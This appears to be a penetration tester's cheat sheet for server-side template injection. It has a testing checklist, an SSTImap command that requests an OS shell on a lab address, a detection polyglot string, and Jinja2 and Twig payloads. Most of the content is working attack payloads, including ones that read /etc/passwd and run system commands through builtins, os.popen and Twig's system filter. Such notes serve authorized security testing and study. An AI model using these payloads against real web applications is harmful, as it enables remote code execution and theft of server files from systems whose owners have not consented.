Server Side Template Injection
- [ ] Reflection of user input
- [ ] Identify template engine
	- [ ] Known payload found in application
	- [ ] Enumerate with template engine failure (reference to nonexistent object)
- [ ] Attempt to return class object, read file then RCE
-  Automation tool: SSTIMap
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```
***Detection***
```bash
${{<%[%'"}}%\.
```
### Python
***Jinja2***
```jinja2
{{ 7*7 }}
{{settubgs}}
{% debug %}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
### PHP 
***Twig***
```twig
{{ 7*7 }}
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```